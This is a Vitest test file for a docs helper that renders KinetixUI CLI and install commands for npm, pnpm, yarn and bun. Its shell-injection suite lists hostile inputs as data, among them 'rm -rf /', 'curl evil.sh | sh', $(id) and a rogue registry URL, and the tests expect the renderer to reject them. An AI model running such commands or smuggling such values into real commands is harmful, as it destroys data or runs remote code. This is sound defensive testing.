import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { PACKAGES } from "./packages";
import {
  DEFAULT_PACKAGE_MANAGER,
  OPERATIONS,
  OPERATION_IDS,
  PACKAGE_MANAGERS,
  parsePackageManager,
  renderAll,
  renderCommand,
  type OperationId,
  type PackageManager,
} from "./pm-commands";

const REPO = path.resolve(__dirname, "../../../..");
const PROGRAM = readFileSync(path.join(REPO, "packages/cli/src/program.ts"), "utf8");

/** Every subcommand `packages/cli/src/program.ts` declares, read out of the file rather than restated here. */
const DECLARED_CLI_COMMANDS = new Set(Array.from(PROGRAM.matchAll(/\.command\("([a-z-]+)"\)/g), (m) => m[1]));

describe("the operation table cannot describe a CLI that does not exist", () => {
  it("reads a non-trivial command list out of program.ts", () => {
    // if the regex ever stops matching, every assertion below would pass vacuously
    expect(DECLARED_CLI_COMMANDS.size).toBeGreaterThan(8);
    expect(DECLARED_CLI_COMMANDS).toContain("add");
  });

  it("names only subcommands the CLI declares", () => {
    for (const id of OPERATION_IDS) {
      const op = OPERATIONS[id];
      if (!("args" in op) || !op.args) continue;
      for (const token of op.args) {
        if (token.startsWith("-")) continue;
        expect(DECLARED_CLI_COMMANDS, `${id} names "${token}"`).toContain(token);
      }
    }
  });

  it("does not document shadcn CLI verbs KinetixUI has never implemented", () => {
    // `create` is deliberately absent from this list: KinetixUI does have one, as `theme create`. The
    // verbs below have no KinetixUI implementation at all, and a docs page must not imply them.
    const absent = ["search", "view", "diff", "apply", "dry-run"];
    const everyArg = OPERATION_IDS.flatMap((id) => [...(((OPERATIONS[id] as { args?: readonly string[] }).args) ?? [])]);
    for (const verb of absent) {
      expect(everyArg, `"${verb}" is not a KinetixUI CLI command`).not.toContain(verb);
      expect(DECLARED_CLI_COMMANDS, `"${verb}" appeared in the CLI — the docs may now claim it`).not.toContain(verb);
    }
  });

  it("executes a package that really is published under that name", () => {
    for (const id of OPERATION_IDS) {
      const pkg = (OPERATIONS[id] as { executePackage?: string }).executePackage;
      if (pkg) expect(pkg).toBe(PACKAGES.cli);
    }
  });

  it("never executes the bare bin name, which is not an npm package", () => {
    // `kinetixui` is the bin inside @kinetixui/cli. `npx kinetixui` would fetch somebody else's package.
    for (const id of OPERATION_IDS) {
      for (const pm of PACKAGE_MANAGERS) {
        const { tokens } = renderCommand(id, pm);
        expect(tokens, `${id}/${pm}`).not.toContain("kinetixui");
      }
    }
  });
});

describe("stable command IDs", () => {
  it("has exactly this set of operations", () => {
    // a docs page references an id; losing or renaming one silently empties a fence
    expect([...OPERATION_IDS].sort()).toEqual(
      [
        "cli-add",
        "cli-add-all",
        "cli-doctor",
        "cli-init",
        "cli-inspect",
        "cli-lint",
        "cli-list",
        "cli-parity",
        "cli-preset-compose",
        "cli-preset-css",
        "cli-preset-decode",
        "cli-preset-flutter",
        "cli-preset-swiftui",
        "cli-preset-url",
        "cli-theme-build",
        "cli-theme-create",
        "install-angular",
        "install-iot",
        "install-iot-react",
        "install-react",
        "install-tailwind",
        "install-tokens",
        "run-dev",
      ].sort(),
    );
  });

  it("gives every operation an id matching its key", () => {
    for (const id of OPERATION_IDS) expect(OPERATIONS[id].id).toBe(id);
  });
});

describe("exact command output, per manager", () => {
  const cases: Array<[OperationId, Record<PackageManager, string>]> = [
    [
      "install-react",
      {
        npm: "npm install @kinetixui/ui @kinetixui/tokens",
        pnpm: "pnpm add @kinetixui/ui @kinetixui/tokens",
        yarn: "yarn add @kinetixui/ui @kinetixui/tokens",
        bun: "bun add @kinetixui/ui @kinetixui/tokens",
      },
    ],
    [
      "install-tokens",
      {
        npm: "npm install @kinetixui/tokens",
        pnpm: "pnpm add @kinetixui/tokens",
        yarn: "yarn add @kinetixui/tokens",
        bun: "bun add @kinetixui/tokens",
      },
    ],
    [
      "install-angular",
      {
        npm: "npm install @kinetixui/angular @kinetixui/tokens",
        pnpm: "pnpm add @kinetixui/angular @kinetixui/tokens",
        yarn: "yarn add @kinetixui/angular @kinetixui/tokens",
        bun: "bun add @kinetixui/angular @kinetixui/tokens",
      },
    ],
    [
      "install-tailwind",
      {
        npm: "npm install -D tailwindcss@3 postcss autoprefixer",
        pnpm: "pnpm add -D tailwindcss@3 postcss autoprefixer",
        yarn: "yarn add -D tailwindcss@3 postcss autoprefixer",
        bun: "bun add -d tailwindcss@3 postcss autoprefixer",
      },
    ],
    [
      "cli-init",
      {
        npm: "npx @kinetixui/cli init",
        pnpm: "pnpm dlx @kinetixui/cli init",
        yarn: "yarn dlx @kinetixui/cli init",
        bun: "bunx @kinetixui/cli init",
      },
    ],
    [
      "cli-add-all",
      {
        npm: "npx @kinetixui/cli add --all",
        pnpm: "pnpm dlx @kinetixui/cli add --all",
        yarn: "yarn dlx @kinetixui/cli add --all",
        bun: "bunx @kinetixui/cli add --all",
      },
    ],
    [
      "cli-theme-build",
      {
        npm: "npx @kinetixui/cli theme build <theme>",
        pnpm: "pnpm dlx @kinetixui/cli theme build <theme>",
        yarn: "yarn dlx @kinetixui/cli theme build <theme>",
        bun: "bunx @kinetixui/cli theme build <theme>",
      },
    ],
    [
      "run-dev",
      { npm: "npm run dev", pnpm: "pnpm run dev", yarn: "yarn run dev", bun: "bun run dev" },
    ],
  ];

  for (const [id, expected] of cases) {
    it(id, () => {
      const rendered = renderAll(id);
      for (const pm of PACKAGE_MANAGERS) expect(rendered[pm].command).toBe(expected[pm]);
    });
  }

  it("puts the components after the subcommand, in the order given", () => {
    expect(renderCommand("cli-add", "npm", { components: ["button", "card", "dialog"] }).command).toBe(
      "npx @kinetixui/cli add button card dialog",
    );
    expect(renderCommand("cli-add", "pnpm", { components: ["date-picker"] }).tokens).toEqual([
      "pnpm",
      "dlx",
      "@kinetixui/cli",
      "add",
      "date-picker",
    ]);
  });

  it("keeps a flag before the parameter and the package before both", () => {
    expect(renderCommand("cli-add-all", "bun").tokens).toEqual(["bunx", "@kinetixui/cli", "add", "--all"]);
  });

  it("renders a preset command the reader can actually run", () => {
    // the defect this replaces: /docs/cli and /create printed a bare `kinetixui preset …`
    expect(renderCommand("cli-preset-css", "npm", { preset: "KX1_abc-DEF_123" }).command).toBe(
      "npx @kinetixui/cli preset css KX1_abc-DEF_123",
    );
  });

  it("leaves lint's optional path off rather than inventing one", () => {
    const r = renderCommand("cli-lint", "yarn");
    expect(r.command).toBe("yarn dlx @kinetixui/cli lint");
    expect(r.placeholder).toBe(false);
    expect(renderCommand("cli-lint", "yarn", { path: "src/app" }).command).toBe("yarn dlx @kinetixui/cli lint src/app");
  });
});

describe("package-manager syntax", () => {
  it("uses each manager's own install verb", () => {
    expect(renderCommand("install-tokens", "npm").tokens.slice(0, 2)).toEqual(["npm", "install"]);
    for (const pm of ["pnpm", "yarn", "bun"] as const) {
      expect(renderCommand("install-tokens", pm).tokens.slice(0, 2)).toEqual([pm, "add"]);
    }
  });

  it("uses each manager's own execute route, never a plain install", () => {
    expect(renderCommand("cli-init", "npm").tokens[0]).toBe("npx");
    expect(renderCommand("cli-init", "pnpm").tokens.slice(0, 2)).toEqual(["pnpm", "dlx"]);
    expect(renderCommand("cli-init", "yarn").tokens.slice(0, 2)).toEqual(["yarn", "dlx"]);
    expect(renderCommand("cli-init", "bun").tokens[0]).toBe("bunx");
  });

  it("never adds the CLI as a dependency when the operation is an execute", () => {
    for (const pm of PACKAGE_MANAGERS) {
      const { tokens } = renderCommand("cli-add", pm, { components: ["button"] });
      expect(tokens).not.toContain("install");
      expect(tokens).not.toContain("add-dependency");
      // "add" here is the CLI's own subcommand, which must come after the package name
      expect(tokens.indexOf("add")).toBeGreaterThan(tokens.indexOf(PACKAGES.cli));
    }
  });

  it("spells bun's dev flag the way bun spells it", () => {
    expect(renderCommand("install-tailwind", "bun").tokens).toContain("-d");
    expect(renderCommand("install-tailwind", "bun").tokens).not.toContain("-D");
  });
});

describe("an unsupported combination is explained, not faked", () => {
  it("warns about Yarn Classic on every execute operation and only there", () => {
    for (const id of OPERATION_IDS) {
      const kind = OPERATIONS[id].kind;
      for (const pm of PACKAGE_MANAGERS) {
        const notes = renderCommand(id, pm, { components: ["button"], theme: "acme", preset: "KX1_x", component: "button" }).caveats;
        const dlx = notes.filter((n) => /\bdlx\b/.test(n));
        if (kind === "execute" && pm === "yarn") {
          expect(dlx, `${id}/${pm}`).toHaveLength(1);
          expect(dlx[0]).toMatch(/Yarn Classic/);
        } else {
          expect(dlx, `${id}/${pm}`).toHaveLength(0);
        }
      }
    }
  });

  it("tells a Yarn reader about the peer dependency its build needs, and tells nobody else", () => {
    // the consumer matrix measured this: both Yarn lines fail the build without react-is, the other three pass
    const peer = (pm: PackageManager) =>
      renderCommand("install-react", pm).caveats.filter((n) => /react-is/.test(n));
    expect(peer("yarn")).toHaveLength(1);
    expect(peer("yarn")[0]).toMatch(/yarn add react-is/);
    for (const pm of ["npm", "pnpm", "bun"] as const) expect(peer(pm), pm).toHaveLength(0);
  });

  it("carries no caveat at all where none was measured", () => {
    for (const pm of ["npm", "pnpm", "bun"] as const) {
      expect(renderCommand("install-react", pm).caveats, pm).toEqual([]);
      expect(renderCommand("cli-init", pm).caveats, pm).toEqual([]);
    }
  });
});

describe("placeholders are labelled as placeholders", () => {
  it("flags a missing required parameter", () => {
    for (const id of ["cli-add", "cli-inspect", "cli-theme-create", "cli-preset-css"] as const) {
      const r = renderCommand(id, "npm");
      expect(r.placeholder, id).toBe(true);
      expect(r.command, id).toMatch(/<[^>]+>/);
    }
  });

  it("does not flag a command that is complete on its own", () => {
    for (const id of ["cli-init", "cli-list", "cli-doctor", "cli-add-all", "install-react", "run-dev"] as const) {
      const r = renderCommand(id, "npm");
      expect(r.placeholder, id).toBe(false);
      expect(r.command, id).not.toMatch(/</);
    }
  });
});

describe("no shell injection through a parameter", () => {
  const hostile = [
    "button; rm -rf /",
    "button && curl evil.sh | sh",
    "button`whoami`",
    "button$(id)",
    "button|tee /tmp/x",
    "../../etc/passwd",
    "--registry=http://evil.example",
    "-o/tmp/pwned",
    "button card", // a space would become a second argument
    "button\nlist",
  ];

  it("treats an empty value as not supplied rather than as a name", () => {
    // "" is falsy, so it takes the placeholder path. Asserted so the behaviour is deliberate, not luck.
    expect(renderCommand("cli-inspect", "npm", { component: "" }).placeholder).toBe(true);
    expect(renderCommand("cli-theme-build", "npm", { theme: "" }).placeholder).toBe(true);
    expect(renderCommand("cli-preset-css", "npm", { preset: "" }).placeholder).toBe(true);
    expect(() => renderCommand("cli-add", "npm", { components: [""] })).toThrow(/invalid component name/i);
  });

  it("refuses a hostile component name", () => {
    for (const bad of hostile) {
      expect(() => renderCommand("cli-add", "npm", { components: [bad] }), bad).toThrow(/invalid component name/i);
      expect(() => renderCommand("cli-inspect", "pnpm", { component: bad }), bad).toThrow(/invalid component name/i);
    }
  });

  it("refuses a hostile theme name", () => {
    for (const bad of hostile) {
      expect(() => renderCommand("cli-theme-build", "yarn", { theme: bad }), bad).toThrow(/invalid theme name/i);
    }
  });

  it("refuses anything that is not a KX1 preset code", () => {
    for (const bad of [...hostile, "KX1 abc", "kx1_abc", "KX1_abc;id", "NOTAPRESET"]) {
      expect(() => renderCommand("cli-preset-css", "bun", { preset: bad }), bad).toThrow(/invalid preset code/i);
    }
  });

  it("refuses a path that escapes the project or carries metacharacters", () => {
    for (const bad of ["../secrets", "src/../../etc", "src;id", "src app", "$HOME"]) {
      expect(() => renderCommand("cli-lint", "npm", { path: bad }), bad).toThrow(/invalid path/i);
    }
    expect(renderCommand("cli-lint", "npm", { path: "src/app" }).command).toContain("src/app");
  });

  it("renders no whitespace inside any single token", () => {
    for (const id of OPERATION_IDS) {
      for (const pm of PACKAGE_MANAGERS) {
        for (const token of renderCommand(id, pm, { components: ["button", "card"], theme: "acme", preset: "KX1_ok", component: "button", path: "src" }).tokens) {
          expect(token, `${id}/${pm}`).not.toMatch(/\s/);
        }
      }
    }
  });
});

describe("parsePackageManager", () => {
  it("accepts the four and nothing else", () => {
    for (const pm of PACKAGE_MANAGERS) expect(parsePackageManager(pm)).toBe(pm);
    expect(parsePackageManager(" PNPM ")).toBe("pnpm");
    for (const bad of ["deno", "npm2", "", null, undefined, "yarn-classic"]) expect(parsePackageManager(bad)).toBeNull();
  });

  it("defaults to a manager that is in the list", () => {
    expect(PACKAGE_MANAGERS).toContain(DEFAULT_PACKAGE_MANAGER);
  });
});

describe("preset exporter flags", () => {
  it("renders -n and -o after the preset code, in that order", () => {
    expect(
      renderCommand("cli-preset-swiftui", "npm", { preset: "KX1_ok", symbol: "AcmeTheme", output: "Sources/AcmeTheme.swift" })
        .command,
    ).toBe("npx @kinetixui/cli preset swiftui KX1_ok -n AcmeTheme -o Sources/AcmeTheme.swift");
  });

  it("offers -o but not -n on the CSS exporter, which generates no symbol", () => {
    expect(renderCommand("cli-preset-css", "pnpm", { preset: "KX1_ok", output: "src/theme.css", symbol: "Ignored" }).command).toBe(
      "pnpm dlx @kinetixui/cli preset css KX1_ok -o src/theme.css",
    );
  });

  it("omits a flag that was not supplied", () => {
    expect(renderCommand("cli-preset-compose", "bun", { preset: "KX1_ok" }).command).toBe(
      "bunx @kinetixui/cli preset compose KX1_ok",
    );
  });

  it("refuses a hostile symbol or output path", () => {
    for (const bad of ["Acme Theme", "Acme;id", "1Acme", "-nEvil"]) {
      expect(() => renderCommand("cli-preset-swiftui", "npm", { preset: "KX1_ok", symbol: bad }), bad).toThrow(
        /invalid symbol name/i,
      );
    }
    for (const bad of ["../out.swift", "out swift", "$HOME/x"]) {
      expect(() => renderCommand("cli-preset-swiftui", "npm", { preset: "KX1_ok", output: bad }), bad).toThrow(/invalid path/i);
    }
  });
});
